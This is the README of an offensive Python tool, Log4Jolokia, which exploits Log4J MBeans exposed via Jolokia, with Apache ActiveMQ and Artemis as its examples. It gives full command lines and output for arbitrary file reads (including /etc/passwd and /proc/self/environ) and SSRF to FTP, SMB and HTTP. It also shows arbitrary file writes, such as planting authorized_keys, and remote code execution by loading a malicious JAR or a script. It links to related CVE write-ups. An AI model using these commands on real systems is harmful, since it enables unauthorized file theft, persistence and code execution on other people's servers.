# Log4Jolokia

### Description:

Python3 implementation for leveraging and exploiting [Log4J](https://logging.apache.org/log4j/2.x/) MBeans over [Jolokia](https://jolokia.org/)

### Usage:

Generic Help:
```
usage: log4jolokia.py [-h] [-u [USER]] [-p [PASSWD]] [--proxy [PROXY]] [-H [HEADER]] {exec_jar,write_file,read_file,exec_script} [{exec_jar,write_file,read_file,exec_script} ...] target [target ...]

positional arguments:
  {exec_jar,write_file,read_file,exec_script}
                        choose mode: exec_jar | write_file | read_file | exec_script
  target                URL to jolokia (e.g. http://127.0.0.1:8161/console/jolokia)

options:
  -h, --help            show this help message and exit
  -u [USER], --user [USER]
                        Jolokia username
  -p [PASSWD], --passwd [PASSWD]
                        Jolokia password
  --proxy [PROXY]       Optional HTTP(S) Proxy (e.g. burp at http://127.0.0.1:8080)
  -H [HEADER], --header [HEADER]
                        Other required custom HTTP headers (e.g. -H "Origin: http://localhost"
                        	-H "Referrer: http://localhost")
```

**Note:** Depending on what mode you select the help will differ in some sections. 

The program has the following 4 exploitation modes:
- Read files + SSRF
- Write files
- RCE via uploading and executing JAR files
- RCE via [Scripts](https://logging.apache.org/log4j/2.12.x/manual/configuration.html#Scripts)

#### Read files:

By modifying the Log4J "ConfigLocationUri" attribute and reading the new content of "ConfigText" (using the "getConfigText(String)" function or performing a Jolokia "read" action on the "ConfigText" attribute) via the Jolokia API, an attacker is able to read arbitrary files.

**Note**: In this case we will be using the "getConfigText(String)" read vector as we can retreive the byte accurate representation of the output of the files in "latin-1" encoding.

**Note 2**: This vector can also be used to access otherwise unreachable/internal servers:
- read remote files from FTP Server
- read remote files from SMB Server (Windows targets)
- perform blind GET based SSRFs (no output)

Help - Read File Specific Parameters:
```
$ python3 log4jolokia.py read_file http://a -h

  ***TRUNCATED***

  -r [READ], --read [READ]
                        Absolute or relative path of a file to read on target (Use only with mode: read_file)

Example commands:
	- Absolute Path:
		python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -r /etc/passwd -u admin -p admin -H 'Origin: http://localhost'
	- Relative Path:
		python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -r ./artemis -u admin -p admin -H 'Origin: http://localhost'
	- Specific Protocol:
		-- FTP:
		python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -r ftp://test:test@127.0.0.1:22/test -u admin -p admin -H 'Origin: http://localhost'
		-- SMB (Windows only):
		python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -r file:////127.0.0.1/C/test -u admin -p admin -H 'Origin: http://localhost'
		-- HTTP SSRF (Usually no output a.k.a. Blind SSRF):
		python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -r 'http://127.0.0.1:80/test?test=test' -u admin -p admin -H 'Origin: http://localhost'
```

Example - Read "/etc/passwd":
```
$ python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -u admin -p admin -H 'Origin: http://localhost' -r /etc/passwd
[.] Looking for "org.apache.logging.log4j2" mbeans in http://127.0.0.1:8161/console/jolokia/list
[+] Found Log4J Mbean org.apache.logging.log4j2:type=21263314
[+] Found Log4J Mbean org.apache.logging.log4j2:type=76ed5528
[.] Using mbean org.apache.logging.log4j2:type=21263314
[.] Setting ConfigLocationUri to point to arbitrary location /etc/passwd
[+] Successfully set ConfigLocationUri to "/etc/passwd" 
[.] Reading file output from ConfigText
[+] Content of "/etc/passwd":

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
***TRUNCATED***
```

Example - Read "/proc/self/environ" (content contains non-prinatable chars (e.g. null-bytes) so the output will be base64 encoded):
```
$ python3 log4jolokia.py read_file http://127.0.0.1:8161/console/jolokia/ -u admin -p admin -H 'Origin: http://localhost' -r /proc/self/environ
[.] Looking for "org.apache.logging.log4j2" mbeans in http://127.0.0.1:8161/console/jolokia/list
[+] Found Log4J Mbean org.apache.logging.log4j2:type=21263314
[+] Found Log4J Mbean org.apache.logging.log4j2:type=76ed5528
[.] Using mbean org.apache.logging.log4j2:type=21263314
[.] Setting ConfigLocationUri to point to arbitrary location /proc/self/environ
[+] Successfully set ConfigLocationUri to "/proc/self/environ" 
[.] Reading file output from ConfigText
[.] File "/proc/self/environ" contains non-printable characters, displaying base64 encoding
[+] Base64 content of "/proc/self/environ":

TEVTU09QRU49fCAvdXNyL2Jpbi9sZXNzcGlwZSAlcwBNQUlMPS92YXIvbWFpbC9jdGYAVVNFUj1jdGYATENfVElNRT1maV9GSS5VVEYtOABTSE***TRUNCATED***
```

#### Write files:

By creating and loading a malicious Log4J configuration, we can leverage the value of "RollingFile -> fileName" (where to write) and "Pattern" (what to write) parameters in order to write arbitrary content into arbitrary locations. In this case we create malicious Log4J configurations in the XML format and leverage the "setConfigText(String, String)" function.

**Note**: For writing complex binary files, as the XML format has specific [restricted control characters](https://en.wikipedia.org/wiki/Valid_characters_in_XML), other supported configuration formats (e.g. Properties) have been leveraged in a 2-step write process.

Help - Write File Specific Parameters:
```
$ python3 log4jolokia.py write_file http://a -h

  ***TRUNCATED***

  -lf [LOCAL_FILE], --local_file [LOCAL_FILE]
                        Path to local file to be written on the target (Use only with mode: write_file)
  -w [WRITE], --write [WRITE]
                        Path of file to be written on the target (Use only with mode: write_file)
  -P [PERM], --perm [PERM]
                        Permissions of the file written on the target. Useful for files like "authorized_keys" that require "rw-------". (Default value is "rwxrwx---") (Use only with mode: write_file)
  --tmp_dir [TMP_DIR]   Location of a writable directory. (Default value is "/tmp")
                        		E.g. Unix == /tmp
                             		Windows == C:/Users/Public

Example command:
	python3 log4jolokia.py write_file http://127.0.0.1:8161/console/jolokia/ -lf 00-ff.txt -w /tmp/test_write -u admin -p admin -H 'Origin: http://localhost'
```

Example - Write "test" to "/tmp/test":
```
$ echo test > t.txt
$ python3 log4jolokia.py write_file http://127.0.0.1:8161/console/jolokia/ -u admin -p admin -H 'Origin: http://localhost' -lf t.txt -w /tmp/test --proxy http://127.0.0.1:8080
[.] Looking for "org.apache.logging.log4j2" mbeans in http://127.0.0.1:8161/console/jolokia/list
[+] Found Log4J Mbean org.apache.logging.log4j2:type=21263314
[+] Found Log4J Mbean org.apache.logging.log4j2:type=76ed5528
[.] Reading content from t.txt
[.] Generating Log4J configuration
[+] Generated Log4J XML configuration
[.] Using a double setConfigText in order to flush the buffer
[.] Using setConfigText to load the Log4J XML configuration
[+] Successfully called setConfigText()
[.] Checking that the file "/tmp/test" was written successfully on the target
[+] File "/tmp/test" has been successfully written on the target
```

Example - Write a file containing invalid XML characters to "/tmp/test2":
```
$ python3 log4jolokia.py write_file http://127.0.0.1:8161/console/jolokia/ -u admin -p admin -H 'Origin: http://localhost' -lf 00-ff.txt -w /tmp/test2
[.] Looking for "org.apache.logging.log4j2" mbeans in http://127.0.0.1:8161/console/jolokia/list
[+] Found Log4J Mbean org.apache.logging.log4j2:type=21263314
[+] Found Log4J Mbean org.apache.logging.log4j2:type=76ed5528
[.] Reading content from 00-ff.txt
[.] Generating Log4J configuration
[.] Invalid XML characters have been detected in the content
[.] Using a 2 step write techique (XML -> Properties -> File)
[+] Generated Log4J Properties configuration
[+] Embedded Properties configuration in a XML configuration
[.] Using a double setConfigText in order to flush the buffer
[.] Using setConfigText to load the Log4J XML configuration
[+] Successfully called setConfigText()
[+] File "/tmp/mal.properties" should have successfully been written on the target
[.] Using a double setConfigLocationUri in order to flush the buffer and finish writing "/tmp/mal.properties" 
[.] Setting ConfigLocationUri to point to arbitrary location file:/tmp/mal.properties
[+] Successfully set ConfigLocationUri to "file:/tmp/mal.properties" 
[.] Checking that the file "/tmp/test2" was written successfully on the target
[+] File "/tmp/test2" has been successfully written on the target
```

#### Execute JARs:

By using the functionality presented in the "write_file" module, we will write an arbitrary JAR on the target system and then use the "jvmtiAgentLoad([Ljava.lang.String;)" function in order to execute arbitrary Java code.

Help - Execute JAR Specific Parameters:
```
$ python3 log4jolokia.py exec_jar http://a -h

  ***TRUNCATED***

  -j [JAR], --jar [JAR]
                        Path to local jar to be executes on the target (Use only with mode: exec_jar)
  --tmp_dir [TMP_DIR]   Location of a writable directory. (Default value is "/tmp")
                        		E.g. Unix == /tmp
                             		Windows == C:/Users/Public

Example command:
	python3 log4jolokia.py exec_jar http://127.0.0.1:8161/console/jolokia/ -j mal_linux.jar -u admin -p admin -H 'Origin: http://localhost'

Valid jvmtiAgent JARs can be obtained from https://github.com/mbadanoiu/jvmtiAgentLoad-Exploit
```

Example - Write and execute JAR file:
```
$ python3 log4jolokia.py exec_jar http://127.0.0.1:8161/console/jolokia/ -u admin -p admin -H 'Origin: http://localhost' -j mal_linux.jar
[.] Looking for "org.apache.logging.log4j2" mbeans in http://127.0.0.1:8161/console/jolokia/list
[+] Found Log4J Mbean org.apache.logging.log4j2:type=21263314
[+] Found Log4J Mbean org.apache.logging.log4j2:type=76ed5528

[!!!] WARNING: You are about to write and execute the contents of "mal_linux.jar" on the target system. Make sure that:
	- The JAR contains a valid JVM TI agent
	- Once a JAR is successfully loaded:
		-- No new JAR can be loaded until the Java applicaiton is restarted (a.k.a. pick your commands wisely because you only have one shot)
		-- The JAR code will execute everytime the jvmtiAgentLoad() function is successfully called (result == "return code: 0")

If you agree with the above enter "yes" to continue: yes
[.] Reading content from mal_linux.jar
[.] Generating Log4J configuration
[.] Invalid XML characters have been detected in the content
[.] Using a 2 step write techique (XML -> Properties -> File)
[+] Generated Log4J Properties configuration
[+] Embedded Properties configuration in a XML configuration
[.] Using a double setConfigText in order to flush the buffer
[.] Using setConfigText to load the Log4J XML configuration
[+] Successfully called setConfigText()
[+] File "/tmp/mal.properties" should have successfully been written on the target
[.] Using a double setConfigLocationUri in order to flush the buffer and finish writing "/tmp/mal.properties" 
[.] Setting ConfigLocationUri to point to arbitrary location file:/tmp/mal.properties
[+] Successfully set ConfigLocationUri to "file:/tmp/mal.properties" 
[.] Checking that the file "/tmp/mal.jar" was written successfully on the target
[+] File "/tmp/mal.jar" has been successfully written on the target
[+] Successfully called jvmtiAgentLoad()
```

**Note:** As stated in the "WARNING", once you have successfully loaded a JVM TI Agent JAR (return code: 0), redoing the subsequent requests with new/modified JARs (that are valid) will result in the re-execution of only the initaily/first loaded JAR.

#### Execute Scripts:

By using the functionality presented in the "write_file" module, we will write an arbitrary JAR on the target system and then use the "jvmtiAgentLoad([Ljava.lang.String;)" function in order to execute arbitrary Java code.

**Note:** In order for this exploit to work Log4J need to be configured to allow the respective script type (by default no scripts are allowed).

Help - Execute Script Specific Parameters:
```
$ python3 log4jolokia.py exec_script http://a -h

  ***TRUNCATED***

  -sf [SCRIPT_FILE], --script_file [SCRIPT_FILE]
                        Path to local file containing the script to be executed on the target (Use only with mode: exec_script)
  -l [LANGUAGE], --language [LANGUAGE]
                        Language of the script to be executed (E.g. javascript, groovy, beanshell, etc.) (Use only with mode: exec_script)

Example command:
	python3 log4jolokia.py exec_script http://127.0.0.1:8161/console/jolokia/ -sf rce.js -l javascript -u admin -p admin -H 'Origin: http://localhost'
```

Example - Execute Script:
```
$ python3 log4jolokia.py exec_script http://127.0.0.1:8161/console/jolokia/ -sf rce.js -l javascript -u admin -p admin -H 'Origin: http://localhost'
[.] Looking for "org.apache.logging.log4j2" mbeans in http://127.0.0.1:8161/console/jolokia/list
[+] Found Log4J Mbean org.apache.logging.log4j2:type=561b61ed

[!!!] WARNING: You are about to execute a javascript script from the "rce.js" file. 
Keep in mind that this script will be triggered multiple times.

If you agree with the above enter "yes" to continue: yes
[.] Reading javascript script from rce.js
[.] Using setConfigText to load the Log4J XML configuration
[+] Successfully called setConfigText()
[+] The script should have been successfully executed
```

**Note:** This mode loades the respective script, but has no way of knowing if once the script is loaded it is successfully executed or silently fails.

### Additional Resources:

Manual exploitation exemple of the "read_file" mode:
- [CVE-2022-41678: Dangerous MBeans Accessible via Jolokia API in Apache ActiveMQ](https://github.com/mbadanoiu/CVE-2022-41678)
- [CVE-2023-50780 - Initial Report for Apache ActiveMQ Artemis - PDF](https://github.com/mbadanoiu/CVE-2023-50780/blob/main/Apache%20Artemis%20-%20CVE-2023-50780%20-%20Initial%20Report.pdf)

Manual exploitation exemple of the "write_file" mode resulting in RCE:
- [Write arbitrary JSP in Apache ActiveMQ Classic - PDF](https://github.com/mbadanoiu/CVE-2022-41678/blob/main/Apache%20ActiveMQ%20-%20CVE-2022-41678.pdf)
- [Write WAR and restart Jetty in Apache ActiveMQ Artemis - PDF](https://github.com/mbadanoiu/CVE-2023-50780/blob/main/Apache%20Artemis%20-%20CVE-2023-50780%20-%20WAR%20%2B%20Restart%20Vector.pdf)

Manual exploitation exemple of the "exec_jar" mode: 
- [CVE-2023-50780 - JAR + jvmtiAgentLoad in Apache ActiveMQ Artemis - PDF](https://github.com/mbadanoiu/CVE-2023-50780/blob/main/Apache%20Artemis%20-%20CVE-2023-50780%20-%20JAR%20%2B%20jvmtiAgentLoad.pdf)

Manual exploitation exemple of the "exec_script" mode: 
- [MAL-011: Log4J Misconfiguration Allows Malicious JavaScript in Red Hat AMQ](https://github.com/mbadanoiu/MAL-011)
